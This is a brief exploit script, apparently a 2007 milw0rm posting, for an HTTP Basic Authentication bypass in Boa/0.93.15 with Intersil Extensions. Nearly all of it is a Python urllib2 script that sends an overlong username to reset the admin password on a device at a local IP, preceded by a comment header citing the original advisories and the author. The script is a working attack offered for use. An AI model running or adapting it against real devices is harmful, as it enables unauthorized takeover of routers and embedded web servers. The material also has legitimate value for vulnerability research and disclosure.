/*
 * Boa HTTP Basic Authentication Bypass 
 * Vuln: Boa/0.93.15 (with Intersil Extensions)
 *
 * Original Advisory: 
 * http://www.securityfocus.com/archive/1/479434
 * http://www.ikkisoft.com/stuff/SN-2007-02.txt
 *
 *  Luca "ikki" Carettoni
 *  http://www.ikkisoft.com
 */

----

#!/usr/bin/env python
import urllib2

SERVER_IP_ADDRESS = '192.168.0.1'
USERNAME 
= 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
NEW_PASSWORD = 'owned'

auth_handler = urllib2.HTTPBasicAuthHandler()
auth_handler.add_password('LOGIN(default username & password is admin)', 
SERVER_IP_ADDRESS, USERNAME, NEW_PASSWORD);
opener = urllib2.build_opener(auth_handler)
urllib2.install_opener(opener)
res = urllib2.urlopen('http://'+SERVER_IP_ADDRESS+'/home/index.shtml')

# milw0rm.com [2007-10-16]
